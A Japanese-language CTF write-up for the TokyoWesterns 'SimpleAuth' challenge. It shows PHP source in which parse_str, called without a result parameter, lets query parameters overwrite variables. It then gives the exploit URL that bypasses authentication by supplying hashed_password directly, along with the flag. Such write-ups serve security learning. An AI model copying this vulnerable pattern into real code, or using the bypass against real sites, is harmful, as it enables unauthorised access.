# SimpleAuth
```
http://simpleauth.chal.ctf.westerns.tokyo
```

# do
- アクセスするとソースコードが見える
```
<?php

require_once 'flag.php';

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'auth') {
    if (!empty($res['user'])) {
        $user = $res['user'];
    }
    if (!empty($res['pass'])) {
        $pass = $res['pass'];
    }

    if (!empty($user) && !empty($pass)) {
        $hashed_password = hash('md5', $user.$pass);
    }
    if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
        echo $flag;
    }
    else {
        echo 'fail :(';
    }
}
else {
    highlight_file(__FILE__);
}
```
- md5でハッシュ化した後に`c019f6e5cd8aa0bbbcc6e994a54c757e`となっているので、[md5 decrypter](http://hashtoolkit.com/generate-md5-hash/)にかけたけど何も起きない…
- `http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&user=admin&pass=password`これで`fail :(`と表示された。よし。(`highlight_file(__FILE__);`から、今見ているサイトに対してクエリを投げればよいとわかるため)
- あとは`$action='auth'`はうまくいってるので、あとはuserとpassにうまく入れればよい。
- [phpの知識]
    - `$user.$pass`これは文字列結合
    - [parse_str](http://php.net/manual/ja/function.parse-str.php)
    - [hash](http://php.net/manual/ja/function.hash.php)
    - [$_SERVER](http://wepicks.net/phpref-server/)
    - [$_SERVER QUERY_STRING](http://www.phppro.jp/qa/1346)
- md5decrypterにかけても出てこない…
- 文字列の長さは32bitなので、md5でOK
- 一応md4,md2とかで試した(他のも試した)けど、うまく行かない…
- まとめると、md5をなんとかすればいけるはずなんだけどいけない。

# 解説見た
- [参考](http://teppay.hatenablog.com/entry/2018/09/03/130011)
- `highlight_file(__FILE__);`から、今見ているサイトに対してクエリを投げればよいとわかる
- ここまではあっていた
- [parse_str](http://php.net/manual/ja/function.parse-str.php)この説明の、"現在のスコープに変数をセットします"がポイントで、ここで`user`と`pass`をemptyにしておけば`hashed_password`を生成するif文はskipされて、`hashed_password`にセットされた値がそのまま評価される。
- `http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e`にアクセス→`TWCTF{d0_n0t_use_parse_str_without_result_param}`が表示される
- `TWCTF{d0_n0t_use_parse_str_without_result_param}`→AC(アニメーションがとてもいい…)

# くやしい
- `hassed_password`にmd5をセットするのはやったけど、userとpassを適当に指定してしまっていた…ソースコードの処理を読もうね